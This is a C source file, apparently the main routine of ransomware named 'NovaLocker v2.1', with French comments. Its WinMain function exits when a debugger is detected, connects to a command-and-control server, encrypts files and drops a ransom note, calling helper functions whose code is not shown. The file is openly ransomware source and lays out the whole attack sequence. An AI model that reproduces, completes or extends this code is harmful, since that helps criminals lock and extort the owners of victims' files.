#include "../include/common.h"
#include "../include/anti_debug.h"
#include "../include/crypto.h"
#include "../include/network.h"
#include "../include/file_ops.h"

// Global variables
C2_CONFIG g_c2_config = {0};
SOCKET g_c2_socket = INVALID_SOCKET;
BOOL g_debug_detected = FALSE;
DWORD g_files_processed = 0;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    printf("NovaLocker v2.1 - Starting...\n");
    
    // 1. Vérifications anti-debug
    if (!CheckAntiDebug()) {
        printf("Debug detected, exiting.\n");
        ExitProcess(0);
    }
    
    // 2. Initialiser la configuration
    if (!InitializeConfig()) {
        printf("Failed to initialize config.\n");
        return -1;
    }
    
    // 3. Établir la connexion C2
    if (!ConnectToC2()) {
        printf("Failed to connect to C2.\n");
        return -1;
    }
    
    // 4. Lancer le chiffrement de fichiers
    if (!StartFileEncryption()) {
        printf("File encryption failed.\n");
        return -1;
    }
    
    // 5. Créer la note de rançon (diversion)
    CreateRansomNote();
    
    // 6. Nettoyage
    Cleanup();
    
    printf("NovaLocker completed successfully.\n");
    return 0;
}
